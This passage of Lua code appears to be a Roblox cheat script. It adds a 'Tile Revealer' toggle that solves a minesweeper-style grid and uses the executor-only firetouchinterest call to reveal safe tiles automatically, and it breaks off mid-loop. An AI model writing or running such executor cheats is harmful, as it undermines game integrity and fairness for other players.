local function revealPart(part)
    local char = LocalPlayer.Character
    if not char or not part or not part.Parent then return end
    -- Use RightLowerLeg like the working script
    local rightLeg = char:FindFirstChild("RightLowerLeg")
        or char:FindFirstChild("Right Leg")
        or char:FindFirstChild("RightFoot")
        or char:FindFirstChild("HumanoidRootPart")
    if not rightLeg then return end
    pcall(function()
        firetouchinterest(rightLeg, part, 0)
        firetouchinterest(rightLeg, part, 1)
    end)
end

RevealTab:CreateToggle({
    Name = "Tile Revealer AN/AUS",
    CurrentValue = false,
    Flag = "TileRevealer",
    Callback = function(value)
        revealEnabled = value
        if value then
            if revealThread then return end
            revealThread = task.spawn(function()
                while revealEnabled do
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        lastSolveTime = 0
                        local _, safe = solveMines()
                        local revealed = 0

                        local safeInRange = {}
                        for part in pairs(safe) do
                            if part and part.Parent and not isRevealed(part) and not isFlagged(part) then
                                local dist = (part.Position - hrp.Position).Magnitude
                                if dist <= revealRange then
                                    table.insert(safeInRange, {part = part, dist = dist})
                                end
                            end
